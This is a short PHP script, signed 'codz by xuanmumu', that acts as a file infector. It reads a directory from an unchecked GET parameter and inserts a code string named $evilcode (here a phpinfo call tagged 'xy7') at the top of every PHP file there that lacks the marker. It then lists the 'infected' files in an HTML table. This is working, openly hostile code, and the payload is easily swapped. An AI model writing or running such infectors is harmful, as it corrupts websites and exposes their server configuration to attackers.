<?//xy7
if (!isset($dir) or empty($dir)) {
$dir=str_replace('\\','/',dirname(__FILE__));
echo "<font color=\"#00688B\">".$dir."</font>";
} else {
$dir=$_GET['dir'];
echo "<font color=\"#00688B\">".$dir."</font>";
}
$evilcode="<?phpinfo();//xy7?>";
$testdir = opendir($dir);
while($filea = @readdir($testdir)){
if(strstr($filea, '.php')){
$fp = @fopen($filea, 'r+');
if (!strstr(@fread($fp, 20), 'xy7')){
rewind($fp);
$old = @fread($fp, filesize($filea));
rewind($fp);
fwrite($fp, $evilcode . $old);
}
fclose($fp);
}
}
closedir($testdir);
?>
<hr>
<table width="100%" border="0" cellpadding="3" cellspacing="1">
<tr>
<td><b>被X的文件</b></td>
<td><b>时间</b></td>
<td><b>大小</b></td>
</tr>
<?php
$dirs=@opendir($dir);
while ($file=@readdir($dirs)) {
if ((is_file($file)) and (ereg("\.php{0,1}$",$file)))
{$b="$dir/$file";
$a=@is_dir($b);
if($a=="0"){
$size=@filesize("$dir/$file");
$lastsave=@date("Y-n-d H:i:s",filectime("$dir/$file"));
echo "<tr>\n";
echo "<td>$file</td>\n";
echo " <td>$lastsave</td>\n";
echo " <td>$size Bytes</td>\n";
}
}
}
@closedir($dirs);
?>
</table>
codz by xuanmumu